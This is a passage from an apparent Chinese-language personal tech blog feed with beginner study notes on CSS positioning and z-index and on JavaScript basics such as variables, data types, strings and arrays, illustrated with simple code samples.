class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">id</span>=<span class="string">&quot;href4&quot;</span>&gt;</span>链接4<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">id</span>=<span class="string">&quot;href5&quot;</span>&gt;</span>链接5<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210206103036943.png" alt="image-20210206103036943"></p>
<h3 id="6-2-绝对定位"><a href="#6-2-绝对定位" class="headerlink" title="6.2 绝对定位"></a>6.2 绝对定位</h3><p>定位：基于XXX定位，上下左右</p>
<p>绝对定位：<code>position:absolute;</code></p>
<ol>
<li>没有父级元素定位的前提下，相对于浏览器定位</li>
<li>假设父级元素存在定位，我们通常会相对于父级元素进行偏移</li>
</ol>
<p>相对于父级或浏览器的位置，进行指定的偏移，绝对定位的话，它不再标准文档流中，原来的位置不会被保留</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    相对定位</span></span><br><span class="line"><span class="comment">    相对于自己原来的位置进行偏移</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        body&#123;</span><br><span class="line">            padding: 20px;</span><br><span class="line">        &#125;</span><br><span class="line">        div&#123;</span><br><span class="line">            margin: 10px;</span><br><span class="line">            padding: 5px;</span><br><span class="line">            font-size: 12px;</span><br><span class="line">            line-height: 25px;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-id">#father</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#666</span>;</span></span><br><span class="line">            padding: 0;</span><br><span class="line">            position: relative;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-id">#first</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">dashed</span> <span class="selector-id">#299e4e</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#299e99</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-id">#second</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">dashed</span> <span class="selector-id">#98ac27</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#98ac99</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">position</span><span class="selector-pseudo">:absolute</span>; <span class="comment">/*绝对定位：上下左右*/</span></span></span><br><span class="line">            right: 20px;</span><br><span class="line">            top: -20px;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-id">#third</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">dashed</span> <span class="selector-id">#722da3</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#722d99</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;father&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;first&quot;</span>&gt;</span>第一个盒子<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;second&quot;</span>&gt;</span>第二个盒子<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;third&quot;</span>&gt;</span>第三个盒子<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="6-3-固定定位-fixed"><a href="#6-3-固定定位-fixed" class="headerlink" title="6.3 固定定位 fixed"></a>6.3 固定定位 fixed</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        body&#123;</span><br><span class="line">            height: 1000px;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">div</span><span class="selector-pseudo">:nth-of-type(1)</span>&#123;     <span class="comment">/*绝对定位*/</span></span></span><br><span class="line">            width: 100px;</span><br><span class="line">            height: 100px;</span><br><span class="line">            background: red;</span><br><span class="line">            position: absolute;</span><br><span class="line">            right: 0;</span><br><span class="line">            bottom: 0;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">div</span><span class="selector-pseudo">:nth-of-type(2)</span>&#123;     <span class="comment">/*固定定位*/</span></span></span><br><span class="line">            width: 50px;</span><br><span class="line">            height: 50px;</span><br><span class="line">            background: yellow;</span><br><span class="line">            position: fixed;</span><br><span class="line">            right: 0;</span><br><span class="line">            bottom: 0;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>div1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>div2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="6-3-z-index"><a href="#6-3-z-index" class="headerlink" title="6.3 z-index"></a>6.3 z-index</h3><p>图层~</p>
<p>z-index：默认是0，最高无限 ~999</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;tip&quot;</span>&gt;</span>学习<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;bg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>时间:2099-1-1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>地点：月球<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>背景透明度： opacity: 0.5;</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#content</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">375px</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">25px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> <span class="number">#000000</span> solid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">ul</span>,<span class="selector-tag">li</span>&#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">list-style</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#content</span> <span class="selector-tag">ul</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*父级元素相对定位*/</span></span><br><span class="line"><span class="selector-class">.tip</span>,<span class="selector-class">.bg</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">380px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">25px</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">216px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.tip</span>&#123;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.bg</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#000000</span>;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0.5</span>;       <span class="comment">/*背景透明度*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="7、动画"><a href="#7、动画" class="headerlink" title="7、动画"></a>7、动画</h2><p>了解…</p>
<h2 id="8、总结"><a href="#8、总结" class="headerlink" title="8、总结"></a>8、总结</h2><p>![CSS 3](<a class="link"   href="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/CSS" >https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/CSS<i class="fas fa-external-link-alt"></i></a> 3.png)</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript基础</title>
    <url>/2021/02/09/JavaScript%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="1、什么是-JavaScript"><a href="#1、什么是-JavaScript" class="headerlink" title="1、什么是 JavaScript"></a>1、什么是 JavaScript</h2><h3 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 概述"></a>1.1 概述</h3><p>JavaScript是一门世界上最流行的脚本语言</p>
<p><strong>一个合格的后端人员，必要要精通 JavaScript</strong></p>
<h3 id="1-2-ECMAScript"><a href="#1-2-ECMAScript" class="headerlink" title="1.2 ECMAScript"></a>1.2 ECMAScript</h3><p><strong>ECMAScript</strong>可以理解为是JavaScript的一个标注</p>
<p>最新为ES6版本，但是大部分浏览器只停留在支持ES5代码上</p>
<h2 id="2、快速入门"><a href="#2、快速入门" class="headerlink" title="2、快速入门"></a>2、快速入门</h2><h3 id="2-1-引入JavaScript"><a href="#2-1-引入JavaScript" class="headerlink" title="2.1 引入JavaScript"></a>2.1 引入JavaScript</h3><ol>
<li>内部标签</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="comment">//.....</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>外部引入</li>
</ol>
<p>abs.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//..</span></span><br></pre></td></tr></table></figure>
<p>test.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;abc.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p>测试代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--script标签内，写Javascript代码--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;script&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        alert(&#x27;hello world&#x27;);--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;/script&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--外部引入--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--注意：script标签必须成对出现--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/qj.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--不用显示定义type，也默认就是--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--这里也可以存放--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="2-2-基本语法入门"><a href="#2-2-基本语法入门" class="headerlink" title="2.2 基本语法入门"></a>2.2 基本语法入门</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--javascript严格区分大小写--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 1.定义变量    变量类型    变量名 = 变量值；</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> score = <span class="number">71</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> name = <span class="string">&quot;john&quot;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//alert(num);</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 2.条件控制</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (score&gt;<span class="number">60</span> &amp;&amp; score&lt;<span class="number">70</span>)&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">&quot;60~70&quot;</span>);</span></span><br><span class="line"><span class="javascript">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (score&gt;<span class="number">70</span> &amp;&amp; score&lt;<span class="number">80</span>)&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">&quot;70~80&quot;</span>);</span></span><br><span class="line"><span class="javascript">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">&quot;other&quot;</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line"><span class="javascript">    * <span class="built_in">console</span>.log(score) 在浏览器的控制台打印变量！ system.out.println()；</span></span><br><span class="line">    * */</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="2-3-数据类型"><a href="#2-3-数据类型" class="headerlink" title="2.3 数据类型"></a>2.3 数据类型</h3><p>数值，文本，图形，音频，视频…</p>
<p><strong>变量</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> 王者荣耀 = <span class="string">&quot;倔强青铜&quot;</span>;</span><br></pre></td></tr></table></figure>


<p><strong>number</strong></p>
<p>js不区分小数和整数，Number</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">132</span>    <span class="comment">//整数123</span></span><br><span class="line"><span class="number">123.1</span>  <span class="comment">//浮点数123.1</span></span><br><span class="line"><span class="number">1.23e3</span>		<span class="comment">//科学计数法</span></span><br><span class="line">-<span class="number">99</span>		<span class="comment">//负数</span></span><br><span class="line"><span class="literal">NaN</span>		<span class="comment">//not a number</span></span><br><span class="line"><span class="literal">Infinity</span>	<span class="comment">//表示无穷大</span></span><br></pre></td></tr></table></figure>


<p><strong>字符串</strong></p>
<p>‘abc’    “abc”</p>
<p>‘\n’</p>
<p><strong>布尔值</strong></p>
<p>true, false</p>
<p><strong>逻辑运算</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;&amp;：两个都为真，结果为真</span><br><span class="line"></span><br><span class="line">||：一个为真，结果为真</span><br><span class="line"></span><br><span class="line">!：取反</span><br></pre></td></tr></table></figure>


<p><strong>比较运算符（重要）</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;：赋值</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;：等于（类型不一样，值一样，也会判断为true）</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;：绝对等于（类型一样，值一样，结果为true）</span><br></pre></td></tr></table></figure>
<p>这是一个JS的缺陷，坚持不要使用<code>==</code></p>
<p>须知：</p>
<ul>
<li>NaN===NaN，这个与所有的值都不相等，包括自己</li>
<li>只能通过 <code>isNaN(NaN)</code> 来判断这个数是否是NaN</li>
</ul>
<p><strong>浮点数问题</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">console.log((1&#x2F;3) &#x3D;&#x3D;&#x3D; (1-2&#x2F;3));</span><br></pre></td></tr></table></figure>
<p>尽量避免使用浮点数进行运算，存在精度问题！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Math.abs(1&#x2F;3-(1-2&#x2F;3))&lt;0.00000001</span><br></pre></td></tr></table></figure>


<p><strong>null和undefined</strong></p>
<ul>
<li>null 空</li>
<li>undefined 未定义</li>
</ul>
<p><strong>数组</strong></p>
<p>Java的数组必须是相同类型的对象，JS中不需要这样！</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//保证代码的可读性，尽量使用[]</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="string">&#x27;hello&#x27;</span>,<span class="literal">null</span>,<span class="literal">true</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;hello&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>取数组下标，如果越界了，就会<code>undefined</code></p>
<p><strong>对象</strong></p>
<p>对象定义是大括号，数组是中括号~~</p>
<p>每个属性之间用逗号隔开，最后一个不需要添加</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Person person = new Person(1,2,3,4,5);</span></span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    name: <span class="string">&quot;john&quot;</span>,</span><br><span class="line">    age: <span class="number">3</span>,</span><br><span class="line">    tags: [<span class="string">&#x27;js&#x27;</span>,<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;web&#x27;</span>,<span class="string">&#x27;...&#x27;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>取对象的值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">person.age</span><br><span class="line">3</span><br><span class="line">person.name</span><br><span class="line"><span class="string">&quot;john&quot;</span></span><br></pre></td></tr></table></figure>


<h3 id="2-4-严格检查模式"><a href="#2-4-严格检查模式" class="headerlink" title="2.4 严格检查模式"></a>2.4 严格检查模式</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&#x27;use strict&#x27;; 严格检查模式，预防JS的随意性导致产生的一些错误</span></span><br><span class="line"><span class="comment">必须写在JS的第一行！</span></span><br><span class="line"><span class="comment">局部变量建议都使用 let 取定义</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="meta">    &#x27;use strict&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//全局变量</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> i = <span class="number">1</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//ES6 let</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="3、数据类型"><a href="#3、数据类型" class="headerlink" title="3、数据类型"></a>3、数据类型</h2><h3 id="3-1字符串"><a href="#3-1字符串" class="headerlink" title="3.1字符串"></a>3.1字符串</h3><ol>
<li>正常字符串，使用单引号，或者双引号包裹</li>
<li>注意转义字符<code>\</code></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\&#39;</span><br><span class="line">\n</span><br><span class="line">\t</span><br><span class="line">\u4e2d    \u#### unicode字符</span><br><span class="line">\x41		Ascll字符</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>多行字符串编写</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//tab 上面 esc下面</span></span><br><span class="line"><span class="keyword">var</span> msg = <span class="string">`hello</span></span><br><span class="line"><span class="string">           world</span></span><br><span class="line"><span class="string">           你好</span></span><br><span class="line"><span class="string">            `</span></span><br></pre></td></tr></table></figure>
<ol start="4">
<li>模板字符串</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//tab 上面 esc下面</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> age = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">let</span> name = <span class="string">&#x27;john&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> msg = <span class="string">`你好,<span class="subst">$&#123;name&#125;</span>`</span>;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>字符串长度</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">str.length</span><br></pre></td></tr></table></figure>
<ol start="6">
<li>字符串的可变性，不可变</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210206170729874.png" alt="image-20210206170729874"></p>
<ol start="7">
<li>大小写转换</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//注意这里是方法，不是属性</span></span><br><span class="line">student.toLocaleUpperCase()</span><br><span class="line">student.toLowerCase()</span><br></pre></td></tr></table></figure>
<ol start="8">
<li><p>student.indexOf(‘t’)</p>
</li>
<li><p>substring()</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[)</span><br><span class="line">student.substring(<span class="number">1</span>)  <span class="comment">//从第一个字符串截取到最后一个字符串</span></span><br><span class="line">student.substring(<span class="number">1</span>,<span class="number">3</span>)		<span class="comment">//包含第一个字符串，不包含第三个字符串</span></span><br></pre></td></tr></table></figure>


<h3 id="3-2-数组"><a href="#3-2-数组" class="headerlink" title="3.2 数组"></a>3.2 数组</h3><p>Array可以包含任意的数据类型</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>];		<span class="comment">//通过下标取值和赋值</span></span><br><span class="line">arr[<span class="number">0</span>]</span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">1</span></span><br></pre></td></tr></table></figure>
<ol>
<li>长度</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">arr.length</span><br></pre></td></tr></table></figure>
<p>注意：假如给arr.length 赋值，数组大小就会发生变化~，如果赋值过小，元素就会丢失</p>
<ol start="2">
<li>indexOf，通过元素得到下标索引</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">arr.indexOf(<span class="number">2</span>)</span><br><span class="line">&gt; <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>字符串的 “1” 和数字的 1 是不同的</p>
<ol start="3">
<li><p>slice() 截取Array的一部分，返回一个新数组，类似于 string 中的 substring</p>
</li>
<li><p>push, pop</p>
</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">push		<span class="comment">//压入尾部</span></span><br><span class="line">pop		<span class="comment">//弹出尾部的一个元素</span></span><br></pre></td></tr></table></figure>
<ol start="5">
<li>unshift(),  shift()</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">unshift		<span class="comment">//压入到头部</span></span><br><span class="line">shift		<span class="comment">//弹出头部的一个元素</span></span><br></pre></td></tr></table></figure>
<ol start="6">
<li>排序 sort()</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="number">3</span>) [<span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;A&quot;</span>]</span><br><span class="line">arr.sort()</span><br><span class="line">(<span class="number">3</span>) [<span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>]</span><br></pre></td></tr></table></figure>
<ol start="7">
<li>元素反转 reverse()</li>
</ol>
